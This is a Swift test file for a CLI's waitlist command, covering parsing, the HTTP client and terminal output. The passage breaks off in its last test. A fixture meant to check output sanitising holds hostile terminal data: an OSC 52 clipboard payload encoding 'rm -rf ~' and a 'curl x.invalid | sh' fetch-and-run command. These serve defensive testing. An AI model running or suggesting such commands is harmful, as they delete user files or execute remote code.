import ArgumentParser
import Foundation
import ProviderCore
import Testing

@testable import darkbloom

extension FeatureWaitlistAccess {
    /// Answers the place of every waitlist with `place`, the list with that
    /// one place, and a join with `joined` (or `place`), asking no
    /// coordinator. A join prints `joined <feature> <mac count>`, with `none`
    /// for a join that names no Mac.
    static func answering(_ place: FeatureWaitlistLookup, joined: FeatureWaitlistLookup? = nil) -> FeatureWaitlistAccess {
        FeatureWaitlistAccess(
            coordinator: CLICommandSandbox.coordinatorURL,
            waitlists: { place.map { FeatureWaitlists(data: [$0]) } },
            place: { _ in place },
            join: { feature, macCount in
                print("joined \(feature) \(macCount.map { "\($0)" } ?? "none")")
                return joined ?? place
            })
    }

    /// An account Darkbloom approved for Darkbloom Sandbox.
    static let approved = answering(FeatureWaitlistTests.sandbox(.approved))
}

/// The requests a fake transport received.
private final class RecordedRequests: @unchecked Sendable {
    private let lock = NSLock()
    private var requests: [URLRequest] = []

    func append(_ request: URLRequest) { lock.withLock { requests.append(request) } }
    var all: [URLRequest] { lock.withLock { requests } }
}

/// The body a request carries, also after URLSession moved it into a stream.
private func bodyText(_ request: URLRequest) -> String {
    if let body = request.httpBody { return String(decoding: body, as: UTF8.self) }
    guard let stream = request.httpBodyStream else { return "" }
    stream.open()
    defer { stream.close() }
    var data = Data()
    var buffer = [UInt8](repeating: 0, count: 4096)
    while stream.hasBytesAvailable {
        let count = stream.read(&buffer, maxLength: buffer.count)
        guard count > 0 else { break }
        data.append(buffer, count: count)
    }
    return String(decoding: data, as: UTF8.self)
}

/// The method and path of each waitlist request the coordinator stub received.
private func waitlistRequests() -> String {
    CoordinatorStub.requests.filter { $0.url?.path.hasPrefix("/v1/waitlists") == true }
        .map { "\($0.httpMethod ?? "") \($0.url?.path ?? "")" }.joined(separator: ", ")
}

@Suite("darkbloom waitlist")
struct FeatureWaitlistTests {
    /// `GET /v1/waitlists` with the coordinator's catalog, plus a third
    /// waitlist that asks for no Mac and has no start command.
    static let catalog = #"""
    {"data":[{"feature":"cluster","title":"Clusters","summary":"Serve one model with two to four of your Macs.","start_command":"darkbloom cluster","mac_count":{"min":2,"max":4},"status":"none"},{"feature":"sandbox","title":"Darkbloom Sandbox","summary":"Run Darkbloom Sandbox CI jobs on your Mac.","start_command":"darkbloom sandbox setup","mac_count":{"min":1,"max":1},"status":"waitlisted","position":3,"requested_at":"2026-10-30T03:10:00.123456Z"},{"feature":"research","title":"Research previews","summary":"Try models before they ship.","status":"none"}]}
    """#

    static func place(_ feature: String, _ title: String, _ status: FeatureWaitlistPlace.Status = .none,
                      position: Int? = nil, requested: Date? = nil, decided: Date? = nil, start: String? = nil,
                      macs: FeatureWaitlistPlace.MacCount? = nil, summary: String? = nil) -> FeatureWaitlistPlace {
        FeatureWaitlistPlace(feature: feature, title: title, summary: summary, startCommand: start, macCount: macs,
                             status: status, position: position, requestedAt: requested, decidedAt: decided)
    }

    static let cluster = place("cluster", "Clusters", start: "darkbloom cluster", macs: .init(min: 2, max: 4),
                               summary: "Serve one model with two to four of your Macs.")
    static let research = place("research", "Research previews", summary: "Try models before they ship.")

    /// The account's place on the Darkbloom Sandbox waitlist, as the
    /// coordinator's catalog describes that waitlist.
    static func sandbox(_ status: FeatureWaitlistPlace.Status, position: Int? = nil) -> FeatureWaitlistLookup {
        .success(place("sandbox", "Darkbloom Sandbox", status, position: position, start: "darkbloom sandbox setup",
                       macs: .init(min: 1, max: 1), summary: "Run Darkbloom Sandbox CI jobs on your Mac."))
    }

    static let day: @Sendable (Date) -> String = { _ in "Oct 29, 2026" }

    /// A catalog whose text tries to drive the terminal: OSC 52 (write the
    /// clipboard), a newline that fakes a line, a bidirectional override and
    /// a C1 CSI.
    static let hostileCatalog = #"""
    {"data":[{"feature":"gpu","title":"GPUs\u001b]52;c;cm0gLXJmIH4=\u0007","summary":"Fast.\nStart: darkbloom gpu\u202e","start_command":"darkbloom gpu\u009b8m; curl x.invalid | sh","status":"approved"}]}
    """#

    /// What no printed line may hold: controls, format characters and line
    /// separators.
    static let unprintable = CharacterSet.controlCharacters.union(.newlines)

    // MARK: - Arguments

    @Test("darkbloom waitlist takes an optional name and action, and --macs only with join")
    func parsing() throws {
        let list = try #require(try Darkbloom.parseAsRoot(["waitlist"]) as? Waitlist)
        #expect(list.name == nil && list.action == .status && list.macs == nil && !list.json)
        #expect(try #require(try Darkbloom.parseAsRoot(["waitlist", "--json"]) as? Waitlist).json)
        let join = try #require(try Darkbloom.parseAsRoot(["waitlist", "clusters", "join", "--macs", "3", "--json"]) as? Waitlist)
        #expect(join.name == "clusters" && join.action == .join && join.macs == 3 && join.json)
        let status = try #require(try Darkbloom.parseAsRoot(["waitlist", "sandbox", "status", "--config", "/tmp/provider.toml"])
            as? Waitlist)
        #expect(status.name == "sandbox" && status.action == .status && status.configOptions.config == "/tmp/provider.toml")
        #expect(try #require(try Darkbloom.parseAsRoot(["waitlist", "research", "join"]) as? Waitlist).macs == nil)
        for invalid in [["clusters", "leave"], ["clusters", "--macs", "3"], ["--macs", "2"], ["clusters", "join", "--macs", "0"],
                        ["clusters", "join", "extra"]] {
            #expect(throws: (any Error).self, "\(invalid)") { try Waitlist.parse(invalid) }
        }
        // The cluster and sandbox groups keep their own commands.
        #expect(try Darkbloom.parseAsRoot(["cluster", "setup"]) is Cluster.Setup)
        #expect(try Darkbloom.parseAsRoot(["sandbox", "status"]) is Sandbox.Status)
    }

    @Test("darkbloom waitlist's help names the arguments; the cluster and sandbox groups list no waitlist")
    func help() {
        let waitlist = Darkbloom.helpMessage(for: Waitlist.self, columns: 1_000)
        #expect(waitlist.contains("waitlist [<name>] [<action>] [--macs <n>] [--json] [--config <config>]"))
        #expect(waitlist.contains("(values: status, join; default: status)"))
        #expect(!Darkbloom.helpMessage(for: Cluster.self, columns: 1_000).contains("\n  waitlist "))
        let sandbox = Darkbloom.helpMessage(for: Sandbox.self, columns: 1_000)
        #expect(!sandbox.contains("\n  waitlist "))
        #expect(sandbox.contains("Darkbloom Sandbox is open to the accounts Darkbloom approves from its waitlist"))
    }

    // MARK: - Catalog

    @Test("a name is a catalog id, ignoring case, or its plural with s or es")
    func names() throws {
        let waitlists = FeatureWaitlists(data: [Self.cluster, try Self.sandbox(.none).get(), Self.research])
        for (name, feature) in [("clusters", "cluster"), ("cluster", "cluster"), ("Clusters", "cluster"), ("sandbox", "sandbox"),
                                ("sandboxes", "sandbox"), ("SANDBOX", "sandbox"), ("research", "research")] {
            #expect(waitlists.named(name)?.feature == feature, "\(name)")
        }
        for unknown in ["cluste", "clusterss", "sand", "status", "join", ""] {
            #expect(waitlists.named(unknown) == nil, "\(unknown)")
        }
        // An exact id wins over another id's plural.
        #expect(FeatureWaitlists(data: [Self.place("gpu", "GPUs"), Self.place("gpus", "GPU pools")]).named("gpus")?.title == "GPU pools")
        // A plural that two ids share names neither; each id still names its own.
        let shared = FeatureWaitlists(data: [Self.place("box", "Boxes"), Self.place("boxe", "Boxe")])
        #expect(shared.named("boxes") == nil && shared.named("box")?.title == "Boxes" && shared.named("boxe")?.title == "Boxe")
    }

    @Test("--macs defaults to the fewest a waitlist takes and stays in its range; a waitlist without one takes none")
    func macs() throws {
        #expect(try Self.cluster.joinMacCount(nil) == 2)
        #expect(try Self.cluster.joinMacCount(4) == 4)
        for outside in [1, 5] {
            #expect(throws: FeatureWaitlistMacsRefusal("--macs must be between 2 and 4 for the Clusters waitlist.")) {
                try Self.cluster.joinMacCount(outside)
            }
        }
        let sandbox = try Self.sandbox(.none).get()
        #expect(try sandbox.joinMacCount(nil) == 1)
        #expect(throws: FeatureWaitlistMacsRefusal("--macs must be 1 for the Darkbloom Sandbox waitlist.")) { try sandbox.joinMacCount(2) }
        #expect(try Self.research.joinMacCount(nil) == nil)
        #expect(throws: FeatureWaitlistMacsRefusal("--macs does not apply to the Research previews waitlist: it asks for no Mac.")) {
            try Self.research.joinMacCount(2)
        }
        // A range the coordinator got backwards refuses every count instead of trapping.
        #expect(throws: FeatureWaitlistMacsRefusal.self) { try Self.place("odd", "Odd", macs: .init(min: 3, max: 2)).joinMacCount(nil) }
    }

    // MARK: - Client

    @Test("each answer of the coordinator becomes a place, the list or a problem")
    func answers() throws {
        let waitlisted = try FeatureWaitlistClient.answer(status: 200, body: Data(
            #"{"feature":"cluster","title":"Clusters","summary":"Serve one model with two to four of your Macs.","start_command":"darkbloom cluster","mac_count":{"min":2,"max":4},"status":"waitlisted","position":3,"requested_at":"2026-10-30T03:10:00.123456Z"}"#.utf8),
            as: FeatureWaitlistPlace.self).get()
        #expect(waitlisted.title == "Clusters" && waitlisted.startCommand == "darkbloom cluster" && waitlisted.macCount == .init(min: 2, max: 4))
        #expect(waitlisted.status == .waitlisted && waitlisted.position == 3 && waitlisted.requestedAt != nil && waitlisted.decidedAt == nil)
        let approved = try FeatureWaitlistClient.answer(status: 200, body: Data(
            #"{"feature":"research","title":"Research previews","status":"approved","decided_at":"2026-10-30T03:10:00Z"}"#.utf8),
            as: FeatureWaitlistPlace.self).get()
        #expect(approved.status == .approved && approved.decidedAt != nil && approved.position == nil)
        #expect(approved.summary == nil && approved.startCommand == nil && approved.macCount == nil)
        // Fields the CLI does not know are left out, and null reads as absent.
        let extended = try FeatureWaitlistClient.answer(status: 200, body: Data(
            #"{"feature":"gpu","title":"GPUs","summary":null,"start_command":null,"mac_count":null,"status":"none","counts":{"waitlisted":3},"docs":"gpus"}"#.utf8),
            as: FeatureWaitlistPlace.self).get()
        #expect(extended == Self.place("gpu", "GPUs"))
        let catalog = try FeatureWaitlistClient.answer(status: 200, body: Data(Self.catalog.utf8), as: FeatureWaitlists.self).get()
        #expect(catalog.data.map(\.feature) == ["cluster", "sandbox", "research"])
        #expect(FeatureWaitlistClient.answer(status: 404, body: Data(), as: FeatureWaitlists.self) == .failure(.notOffered))
        #expect(FeatureWaitlistClient.answer(status: 404, body: Data(
            #"{"error":{"type":"not_found","message":"unknown waitlist; the waitlists are cluster and sandbox"}}"#.utf8),
            as: FeatureWaitlistPlace.self) == .failure(.notOffered))
        #expect(FeatureWaitlistClient.answer(status: 401, body: Data(), as: FeatureWaitlistPlace.self) == .failure(.needsLogin))
        #expect(FeatureWaitlistClient.answer(status: 400, body: Data(
            #"{"error":{"type":"invalid_request_error","message":"mac_count must be from 2 to 4"}}"#.utf8),
            as: FeatureWaitlistPlace.self) == .failure(.unavailable("HTTP 400: mac_count must be from 2 to 4")))
        // A place without the catalog's title is not the coordinator's answer.
        for unreadable in ["not json", #"{"feature":"cluster","status":"none"}"#] {
            #expect(FeatureWaitlistClient.answer(status: 200, body: Data(unreadable.utf8), as: FeatureWaitlistPlace.self)
                == .failure(.unavailable("the coordinator's answer could not be read")), "\(unreadable)")
        }
    }

    @Test("the token goes only to an https coordinator or this Mac's loopback")
    func base() {
        #expect(FeatureWaitlistClient.base(httpBase: "https://api.darkbloom.dev")?.absoluteString == "https://api.darkbloom.dev")
        #expect(FeatureWaitlistClient.base(httpBase: "http://127.0.0.1:8080") != nil)
        #expect(FeatureWaitlistClient.base(httpBase: "http://localhost:8080") != nil)
        #expect(FeatureWaitlistClient.base(httpBase: "http://[::1]:8080") != nil)
        for refused in ["http://api.darkbloom.dev", "ftp://api.darkbloom.dev", "https://api.darkbloom.dev?x=1", "api.darkbloom.dev"] {
            #expect(FeatureWaitlistClient.base(httpBase: refused) == nil, "\(refused)")
        }
    }

    @Test("reads send no body; a join posts what the waitlist asks for, with the login token")
    func requests() async throws {
        let recorded = RecordedRequests()
        let client = FeatureWaitlistClient(base: try #require(URL(string: "https://coordinator.invalid")), token: "eigeninference-pt-1",
            transport: { request in
                recorded.append(request)
                guard let url = request.url, let response = HTTPURLResponse(url: url, statusCode: 200, httpVersion: nil, headerFields: nil)
                else { throw URLError(.badURL) }
                return (Data(#"{"feature":"cluster","title":"Clusters","status":"waitlisted","position":1}"#.utf8), response)
            })
        _ = await client.waitlists()
        _ = await client.place("sandbox")
        _ = await client.join("cluster", FeatureWaitlistRequest(chip: "Apple M3 Ultra", memoryGB: 512, macCount: 2))
        _ = await client.join("research", FeatureWaitlistRequest())
        try #require(recorded.all.count == 4)
        let (list, read, join, bare) = (recorded.all[0], recorded.all[1], recorded.all[2], recorded.all[3])
        #expect(list.httpMethod == "GET" && list.url?.absoluteString == "https://coordinator.invalid/v1/waitlists" && list.httpBody == nil)
        #expect(read.httpMethod == "GET" && read.url?.path == "/v1/waitlists/sandbox" && read.httpBody == nil)
        #expect(join.httpMethod == "POST" && join.url?.absoluteString == "https://coordinator.invalid/v1/waitlists/cluster")
        #expect([list, read, join, bare].allSatisfy { $0.value(forHTTPHeaderField: "Authorization") == "Bearer eigeninference-pt-1" })
        let joinBody = try #require(join.httpBody)
        let body = try #require(try JSONSerialization.jsonObject(with: joinBody) as? [String: Any])
        #expect(body["chip"] as? String == "Apple M3 Ultra" && body["memory_gb"] as? Int == 512 && body["mac_count"] as? Int == 2)
        #expect(bare.httpMethod == "POST" && bare.url?.path == "/v1/waitlists/research" && bodyText(bare) == "{}")
        let offline = FeatureWaitlistClient(base: try #require(URL(string: "https://coordinator.invalid")), token: nil,
                                            transport: { _ in throw URLError(.cannotFindHost) })
        guard case .failure(.unavailable) = await offline.waitlists() else { Issue.record("an unreachable coordinator"); return }
    }

    // MARK: - Lines

    @Test("sentences take the waitlist's title and start command from the coordinator")
    func lines() {
        let date = Date(timeIntervalSince1970: 1_793_000_000)
        let view = FeatureWaitlistView(cli: "darkbloom", coordinator: "https://api.darkbloom.dev", day: Self.day)
        func cluster(_ status: FeatureWaitlistPlace.Status, _ position: Int? = nil, requested: Date? = nil, decided: Date? = nil,
                     start: String? = "darkbloom cluster") -> FeatureWaitlistPlace {
            Self.place("cluster", "Mac clusters", status, position: position, requested: requested, decided: decided, start: start,
                       macs: .init(min: 2, max: 4))
        }
        #expect(view.lines(cluster(.none), name: "clusters") == [
            "You're not on the Mac clusters waitlist.", "  Join it: darkbloom waitlist clusters join",
        ])
        #expect(view.lines(cluster(.waitlisted, 3, requested: date), name: "clusters") == [
            "You're on the Mac clusters waitlist: #3 in line (joined Oct 29, 2026).",
            "  Darkbloom reviews accounts in the order they joined and approves them by hand.",
            "  Check again: darkbloom waitlist clusters",
        ])
        #expect(view.lines(cluster(.approved, decided: date), name: "cluster") == [
            "Your account is approved for Mac clusters since Oct 29, 2026.", "  Start: darkbloom cluster",
        ])
        // A waitlist without a start command names none; a start command that
        // is not this CLI's is shown as the coordinator wrote it.
        #expect(view.lines(cluster(.approved, start: nil), name: "cluster") == ["Your account is approved for Mac clusters."])
        #expect(view.lines(cluster(.approved, start: "open https://darkbloom.dev/clusters"), name: "cluster").last
            == "  Start: open https://darkbloom.dev/clusters")
        // The DevNet CLI starts the feature with its own name.
        let devnet = FeatureWaitlistView(cli: "darkbloom-dev", coordinator: "https://api.dev.darkbloom.dev", day: Self.day)
        #expect(devnet.lines(cluster(.approved), name: "cluster").last == "  Start: darkbloom-dev cluster")
        #expect(view.lines(Self.place("sandbox", "Darkbloom Sandbox", .revoked, decided: date), name: "sandbox") == [
            "Darkbloom revoked your account's access to Darkbloom Sandbox on Oct 29, 2026.",
            "  Joining again does not restore it; contact Darkbloom if you think this is a mistake.",
        ])
        #expect(view.problem(.needsLogin) == ["Link this Mac to your Darkbloom account first: darkbloom login"])
        #expect(view.problem(.notOffered) == ["https://api.darkbloom.dev has no waitlists yet, so there is nothing to join there."])
        #expect(view.problem(.notOffered, title: "Mac clusters") == ["https://api.darkbloom.dev has no Mac clusters waitlist."])
        #expect(view.problem(.unavailable("HTTP 500: boom")) == ["Could not reach the waitlists at https://api.darkbloom.dev: HTTP 500: boom"])
        #expect(view.problem(.unavailable("HTTP 500: boom"), title: "Darkbloom Sandbox")
            == ["Could not reach the Darkbloom Sandbox waitlist at https://api.darkbloom.dev: HTTP 500: boom"])
    }

    @Test("the list shows each waitlist's title, place and start command, then how to join one")
    func list() throws {
        let date = Date(timeIntervalSince1970: 1_793_000_000)
        let view = FeatureWaitlistView(cli: "darkbloom", coordinator: "https://api.darkbloom.dev", day: Self.day)
        #expect(view.list([
            Self.cluster,
            Self.place("sandbox", "Darkbloom Sandbox", .waitlisted, position: 3, requested: date, start: "darkbloom sandbox setup",
                       summary: "Run Darkbloom Sandbox CI jobs on your Mac."),
            Self.place("research", "Research previews", .approved, decided: date, start: "darkbloom research"),
            Self.place("labs", "Labs", .revoked, decided: date),
        ]) == [
            "Clusters (cluster): not joined",
            "  Serve one model with two to four of your Macs.",
            "",
            "Darkbloom Sandbox (sandbox): #3 in line (joined Oct 29, 2026)",
            "  Run Darkbloom Sandbox CI jobs on your Mac.",
            "",
            "Research previews (research): approved since Oct 29, 2026",
            "  Start: darkbloom research",
            "",
            "Labs (labs): not approved (access revoked on Oct 29, 2026)",
            "",
            "Join one: darkbloom waitlist <name> join",
        ])
        // Nothing left to join: no join line.
        #expect(view.list([Self.place("research", "Research previews", .waitlisted)]) == ["Research previews (research): on the waitlist"])
        #expect(view.list([]) == ["https://api.darkbloom.dev has no waitlists yet, so there is nothing to join there."])
        #expect(view.unknown("gpu", among: [Self.cluster, try Self.sandbox(.none).get(), Self.research]) == [
            "Unknown waitlist 'gpu'. The waitlists are cluster (Clusters), sandbox (Darkbloom Sandbox) and research (Research previews).",
            "  See where you stand on each: darkbloom waitlist",
        ])
        #expect(view.unknown("gpu", among: [Self.cluster]).first == "Unknown waitlist 'gpu'. The only waitlist is cluster (Clusters).")
    }

    @Test("the coordinator's text reaches the terminal without control or format characters; --json escapes them")
    func printableText() throws {
        let view = FeatureWaitlistView(cli: "darkbloom", coordinator: "https://api.darkbloom.dev", day: Self.day)
        let hostile = Self.place("gpu\u{9B}2J", "GPUs\u{1B}]52;c;cm0gLXJmIH4=\u{07}", .approved,
                                 start: "darkbloom gpu\u{1B}[8m; curl x.invalid | sh", summary: "Fast.\nStart: darkbloom gpu\u{202E}")
        let listed = view.list([hostile])
        #expect(listed == [
            "GPUs\u{FFFD}]52;c;cm0gLXJmIH4=\u{FFFD} (gpu\u{FFFD}2J): approved",
            "  Fast.\u{FFFD}Start: darkbloom gpu\u{FFFD}",
            "  Start: darkbloom gpu\u{FFFD}[8m; curl x.invalid | sh",
        ])
        #expect(view.problem(.unavailable("HTTP 400: \u{1B}[31mno"))
            == ["Could not reach the waitlists at https://api.darkbloom.dev: HTTP 400: \u{FFFD}[31mno"])
        let lines = listed + view.lines(hostile, name: "gpu") + view.lines(Self.place("gpu", "GPUs\u{1B}[2J", .revoked), name: "gpu")
            + view.lines(Self.place("gpu", "GPUs\u{85}", .waitlisted), name: "gpu") + view.unknown("g\u{1B}pu", among: [hostile])
            + view.problem(.notOffered, title: hostile.title) + view.problem(.unavailable("HTTP 400: \u{2028}no"), title: hostile.title)
        #expect(lines.allSatisfy { !$0.unicodeScalars.contains(where: Self.unprintable.contains) }, "\(lines)")
        // JSONEncoder escapes only U+0000 to U+001F; the rest is escaped
        // after it, and the JSON reads the same.
        let raw = "{\n  \"title\" : \"a\u{9B}b\u{202E}c\u{7F}d\u{E0041}\u{E9}\"\n}"
        let json = FeatureWaitlistView.escapingUnprintable(json: raw)
        #expect(json == "{\n  \"title\" : \"a\\u009bb\\u202ec\\u007fd\\udb40\\udc41\u{E9}\"\n}")
        #expect(try JSONSerialization.jsonObject(with: Data(json.utf8)) as? [String: String] == ["title": "a\u{9B}b\u{202E}c\u{7F}d\u{E0041}\u{E9}"])
    }

    // MARK: - Commands

    @Test("darkbloom waitlist lists the coordinator's waitlists, and prints its answer with --json")
    func listCommand() async throws {
        let result = try await #require(processExitsWith: .success, observing: [\.standardOutputContent]) {
            let sandbox = try CLICommandSandbox.enter(autoRestart: false)
            defer { sandbox.remove() }
            try sandbox.writeToken("eigeninference-pt-waitlist")
            CoordinatorStub.install(["/v1/waitlists": .json(200, FeatureWaitlistTests.catalog)])
            try await runCLICommand(Waitlist.self, ["waitlist", "--config", sandbox.config.path])
            print("== JSON")
            try await runCLICommand(Waitlist.self, ["waitlist", "--json", "--config", sandbox.config.path])
            print("requests \(waitlistRequests())")
        }
        let output = decodedText(result.standardOutputContent)
        #expect(output.hasPrefix("Clusters (cluster): not joined\n  Serve one model with two to four of your Macs.\n\n"
            + "Darkbloom Sandbox (sandbox): #3 in line (joined "))
        #expect(output.contains("\n\nResearch previews (research): not joined\n  Try models before they ship.\n\n"
            + "Join one: \(Sandbox.cli) waitlist <name> join\n== JSON\n{\n  \"data\" : [\n"))
        #expect(output.contains("\"start_command\" : \"darkbloom sandbox setup\"") && output.contains("\"position\" : 3"))
        #expect(output.hasSuffix("requests GET /v1/waitlists, GET /v1/waitlists\n"))
    }

    @Test("neither the list nor its --json hands the terminal a control or format character of the coordinator's")
    func inertListCommand() async throws {
        let result = try await #require(processExitsWith: .success, observing: [\.standardOutputContent]) {
            let sandbox = try CLICommandSandbox.enter(autoRestart: false)
            defer { sandbox.remove() }
            try sandbox.writeToken("eigeninference-pt-waitlist")
            CoordinatorStub.install(["/v1/waitlists": .json(200, FeatureWaitlistTests.hostileCatalog)])
            try await runCLICommand(Waitlist.self, ["waitlist", "--config", sandbox.config.path])
            try await runCLICommand(Waitlist.self, ["waitlist", "--json", "--config", sandbox.config.path])
        }
        let output = decodedText(result.standardOutputContent)
        #expect(output.hasPrefix("GPUs\u{FFFD}]52;c;cm0gLXJmIH4=\u{FFFD} (gpu): approved\n  Fast.\u{FFFD}Start: darkbloom gpu\u{FFFD}\n"
            + "  Start: \(Sandbox.cli) gpu\u{FFFD}8m; curl x.invalid | sh\n{\n"))
        // The JSON keeps the coordinator's text, escaped.
        #expect(output.contains(#""title" : "GPUs\u001b]52;c;cm0gLXJmIH4=\u0007""#)
            && output.contains(#""summary" : "Fast.\nStart: darkbloom gpu\u202e""#)
            && output.contains(#""start_command" : "darkbloom gpu\u009b8m; curl x.invalid | sh""#))
        #expect(output.unicodeScalars.allSatisfy { $0 == "\n" || !Self.unprintable.contains($0) })
    }

    @Test("waitlist <name> shows the place the list answers, names unknown waitlists, and asks for a login without a token")
    func statusCommand() async throws {
        let plural = try await #require(processExitsWith: .success, observing: [\.standardOutputContent]) {
            let sandbox = try CLICommandSandbox.enter(autoRestart: false)
            defer { sandbox.remove() }
            try sandbox.writeToken("eigeninference-pt-waitlist")
            CoordinatorStub.install(["/v1/waitlists": .json(200, FeatureWaitlistTests.catalog)])
            try await runCLICommand(Waitlist.self, ["waitlist", "Sandboxes", "--config", sandbox.config.path])
            try await runCLICommand(Waitlist.self, ["waitlist", "sandbox", "status", "--json", "--config", sandbox.config.path])
            print("requests \(waitlistRequests())")
        }
        let output = decodedText(plural.standardOutputContent)
        #expect(output.hasPrefix("You're on the Darkbloom Sandbox waitlist: #3 in line (joined "))
        #expect(output.contains("  Check again: \(Sandbox.cli) waitlist sandboxes\n{\n"))
        #expect(output.contains("\"title\" : \"Darkbloom Sandbox\"") && output.contains("\"requested_at\" : \"2026-10-30T03:10:00Z\""))
        #expect(output.hasSuffix("requests GET /v1/waitlists, GET /v1/waitlists\n"))
        let unknown = try await #require(processExitsWith: .failure, observing: [\.standardErrorContent, \.standardOutputContent]) {
            let sandbox = try CLICommandSandbox.enter(autoRestart: false)
            defer { sandbox.remove() }
            try sandbox.writeToken("eigeninference-pt-waitlist")
            CoordinatorStub.install(["/v1/waitlists": .json(200, FeatureWaitlistTests.catalog)])
            await exitWithCommandStatus {
                defer { print("requests \(waitlistRequests())") }
                try await runCLICommand(Waitlist.self, ["waitlist", "gpu", "join", "--config", sandbox.config.path])
            }
        }
        #expect(decodedText(unknown.standardErrorContent) == "Unknown waitlist 'gpu'. The waitlists are cluster (Clusters), "
            + "sandbox (Darkbloom Sandbox) and research (Research previews).\n  See where you stand on each: \(Sandbox.cli) waitlist\n")
        #expect(decodedText(unknown.standardOutputContent) == "requests GET /v1/waitlists\n")
        let anonymous = try await #require(processExitsWith: .failure, observing: [\.standardErrorContent, \.standardOutputContent]) {
            let sandbox = try CLICommandSandbox.enter(autoRestart: false)
            defer { sandbox.remove() }
            CoordinatorStub.install(["/v1/waitlists": .json(401,
                #"{"error":{"type":"authentication_error","message":"missing credentials"}}"#)])
            await exitWithCommandStatus {
                defer { print("authorization \(CoordinatorStub.requests.first?.value(forHTTPHeaderField: "Authorization") ?? "none")") }
                try await runCLICommand(Waitlist.self, ["waitlist", "sandbox", "--config", sandbox.config.path])
            }
        }
        #expect(decodedText(anonymous.standardErrorContent).contains("Link this Mac to your Darkbloom account first: \(Sandbox.cli) login"))
        #expect(decodedText(anonymous.standardOutputContent).hasSuffix("authorization none\n"))
    }

    @Test("a coordinator without waitlists answers 404: there is nothing to join")
    func withoutWaitlists() async throws {
        let result = try await #require(processExitsWith: .failure, observing: [\.standardErrorContent]) {
            let sandbox = try CLICommandSandbox.enter(autoRestart: false)
            defer { sandbox.remove() }
            try sandbox.writeToken("eigeninference-pt-waitlist")
            await exitWithCommandStatus {
                try await runCLICommand(Waitlist.self, ["waitlist", "clusters", "join", "--config", sandbox.config.path])
            }
        }
        #expect(decodedText(result.standardErrorContent)
            == "\(CLICommandSandbox.coordinatorURL) has no waitlists yet, so there is nothing to join there.\n")
    }

    @Test("waitlist clusters join sends this Mac, the Mac count and the login token to the configured coordinator")
    func clusterJoin() async throws {
        let result = try await #require(processExitsWith: .success, observing: [\.standardOutputContent]) {
            let sandbox = try CLICommandSandbox.enter(autoRestart: false)
            defer { sandbox.remove() }
            try sandbox.writeToken("eigeninference-pt-waitlist")
            CoordinatorStub.install([
                "/v1/waitlists": .json(200, FeatureWaitlistTests.catalog),
                "/v1/waitlists/cluster": .json(200,
                    #"{"feature":"cluster","title":"Clusters","start_command":"darkbloom cluster","mac_count":{"min":2,"max":4},"status":"waitlisted","position":4,"requested_at":"2026-10-30T03:10:00.123456Z"}"#),
            ])
            try await runCLICommand(Waitlist.self, ["waitlist", "clusters", "join", "--macs", "3", "--config", sandbox.config.path])
            let request = try #require(CoordinatorStub.requests.last)
            print("request \(request.httpMethod ?? "") \(request.url?.absoluteString ?? "") "
                + "\(request.value(forHTTPHeaderField: "Authorization") ?? "")")
            print("body \(bodyText(request))")
            print("requests \(waitlistRequests())")
        }
        let output = decodedText(result.standardOutputContent)
        #expect(output.contains("You're on the Clusters waitlist: #4 in line (joined "))
        #expect(output.contains("  Check again: \(Sandbox.cli) waitlist clusters\n"))
        #expect(output.contains("request POST https://coordinator.invalid/v1/waitlists/cluster Bearer eigeninference-pt-waitlist\n"))
        #expect(output.contains("\"mac_count\":3") && output.contains("\"chip\":") && output.contains("\"memory_gb\":"))
        #expect(output.hasSuffix("requests GET /v1/waitlists, POST /v1/waitlists/cluster\n"))
    }

    @Test("a waitlist without a Mac range is joined without this Mac, and refuses --macs before asking")
    func joinWithoutMacs() async throws {
        let joined = try await #require(processExitsWith: .success, observing: [\.standardOutputContent]) {
            let sandbox = try CLICommandSandbox.enter(autoRestart: false)
            defer { sandbox.remove() }
            try sandbox.writeToken("eigeninference-pt-waitlist")
            CoordinatorStub.install([
                "/v1/waitlists": .json(200, FeatureWaitlistTests.catalog),
                "/v1/waitlists/research": .json(200,
                    #"{"feature":"research","title":"Research previews","summary":"Try models before they ship.","status":"waitlisted","position":1}"#),
            ])
            try await runCLICommand(Waitlist.self, ["waitlist", "research", "join", "--config", sandbox.config.path])
            let request = try #require(CoordinatorStub.requests.last)
            print("body \(bodyText(request))")
        }
        let output = decodedText(joined.standardOutputContent)
        #expect(output.hasPrefix("You're on the Research previews waitlist: #1 in line.\n"))
        #expect(output.hasSuffix("body {}\n"))
        let unasked = try await #require(processExitsWith: .exitCode(ExitCode.validationFailure.rawValue),
                                         observing: [\.standardErrorContent, \.standardOutputContent]) {
            let sandbox = try CLICommandSandbox.enter(autoRestart: false)
            defer { sandbox.remove() }
            try sandbox.writeToken("eigeninference-pt-waitlist")
            CoordinatorStub.install(["/v1/waitlists": .json(200, FeatureWaitlistTests.catalog)])
            await exitWithCommandStatus {
                defer { print("requests \(waitlistRequests())") }
                try await runCLICommand(Waitlist.self, ["waitlist", "research", "join", "--macs", "2", "--config", sandbox.config.path])
            }
        }
        #expect(decodedText(unasked.standardErrorContent)
            == "--macs does not apply to the Research previews waitlist: it asks for no Mac.\n")
        #expect(decodedText(unasked.standardOutputContent) == "requests GET /v1/waitlists\n")
        let outside = try await #require(processExitsWith: .exitCode(ExitCode.validationFailure.rawValue),
                                         observing: [\.standardErrorContent, \.standardOutputContent]) {
            let sandbox = try CLICommandSandbox.enter(autoRestart: false)
            defer { sandbox.remove() }
            try sandbox.writeToken("eigeninference-pt-waitlist")
            CoordinatorStub.install(["/v1/waitlists": .json(200, FeatureWaitlistTests.catalog)])
            await exitWithCommandStatus {
                defer { print("requests \(waitlistRequests())") }
                try await runCLICommand(Waitlist.self, ["waitlist", "clusters", "join", "--macs", "5", "--config", sandbox.config.path])
            }
        }
        #expect(decodedText(outside.standardErrorContent) == "--macs must be between 2 and 4 for the Clusters waitlist.\n")
        #expect(decodedText(outside.standardOutputContent) == "requests GET /v1/waitlists\n")
    }

    @Test("a revoked account's join shows the revocation and fails")
    func revokedJoin() async throws {
        let result = try await #require(processExitsWith: .failure, observing: [\.standardOutputContent]) {
            let sandbox = try CLICommandSandbox.enter(autoRestart: false)
            defer { sandbox.remove() }
            try sandbox.writeToken("eigeninference-pt-waitlist")
            CoordinatorStub.install([
                "/v1/waitlists": .json(200, FeatureWaitlistTests.catalog),
                "/v1/waitlists/cluster": .json(200, #"{"feature":"cluster","title":"Clusters","status":"revoked"}"#),
            ])
            await exitWithCommandStatus {
                try await runCLICommand(Waitlist.self, ["waitlist", "clusters", "join", "--config", sandbox.config.path])
            }
        }
